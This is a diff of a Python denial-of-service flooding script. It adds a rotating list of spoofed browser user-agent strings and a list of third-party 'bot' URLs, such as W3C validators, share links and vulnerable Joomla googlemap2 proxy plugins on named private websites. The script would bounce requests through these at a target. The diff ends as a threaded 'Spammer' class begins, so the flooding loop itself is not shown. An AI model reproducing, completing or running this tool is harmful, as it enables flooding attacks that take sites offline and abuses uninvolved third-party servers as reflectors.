@@ -1,9 +1,50 @@
 import urllib.request, os, threading, time, random, sys
- 
- 
- 
- 
- 
+
+def user_agent():
+	global uagent
+	uagent=[]
+	uagent.append("Googlebot/2.1 (+http://www.google.com/bot.html)")
+	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
+	uagent.append("Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1")
+	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41")
+	uagent.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36")
+	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0")
+	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0")
+	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+	return(uagent)
+
+
+def my_bots():
+	global bots
+	bots=[]
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://validator.w3.org/feed/check.cgi?url=")
+	bots.append("http://www.google.com/ig/adde?moduleurl=")
+	bots.append("http://www.google.com/?q=")
+	bots.append("http://www.google.com/ig/adde?moduleurl=")
+	bots.append("http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=")
+	bots.append("https://down.com/?q=")
+	bots.append("http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=")
+	bots.append("http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=")
+	bots.append("http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=")
+	bots.append("http://downforeveryoneorjustme.com/")
+	bots.append("http://www.feedvalidator.org/check.cgi?url=")
+	bots.append("https://www.wizards.com/leaving.asp?url=")
+	bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
+	bots.append("http://feed.informer.com/validator/check.cgi?url=")
+	bots.append("http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=")
+	bots.append("http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=")
+	bots.append("https://html5.validator.nu/?doc=")
+	return(bots)
+
+
 class Spammer(threading.Thread):
    
     def __init__(self, url, number, proxy):
